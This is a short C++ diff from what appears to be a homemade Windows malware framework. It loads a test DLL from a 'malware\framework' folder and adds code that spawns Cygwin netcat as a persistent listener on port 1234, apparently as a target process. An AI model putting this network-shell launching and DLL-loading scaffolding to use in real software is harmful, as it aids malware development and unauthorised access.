@@ -6,6 +6,12 @@
 #include "../core/apiget/apiget.h"
 
 #include <windows.h>
+#include <unistd.h>
+
+#include <iostream>
+
+using std::cerr;
+using std::endl;
 
 void *load(const char *name, size_t *read)
 {
@@ -31,10 +37,28 @@ void *load(const char *name, size_t *read)
 
 int main(int argc, char *argv[])
 {
-    // if(argc != 2){
-        // fprintf(stderr, "usage: %s <pid>\n", argv[0]);
-        // exit(1);
-    // }
+    PROCESS_INFORMATION proc_info;
+    STARTUPINFO start_info = {sizeof(STARTUPINFO)};
+
+    char cmd[] = "C:\\cygwin64\\bin\\nc.exe";
+    char arg[] = "C:\\cygwin64\\bin\\nc.exe -k -l 1234";
+
+    if(!CreateProcess(cmd,
+                      arg,
+                      NULL,
+                      NULL,
+                      FALSE,
+                      0,
+                      NULL,
+                      NULL,
+                      &start_info,
+                      &proc_info)
+        ){
+        cerr << "unable to fork exec netcat: " << GetLastError() << endl;
+        exit(EXIT_FAILURE);
+    }
+        
+
 
     size_t size;
     void *dll = load("C:\\Users\\Josh\\Desktop\\malware\\framework\\test.dll", &size);
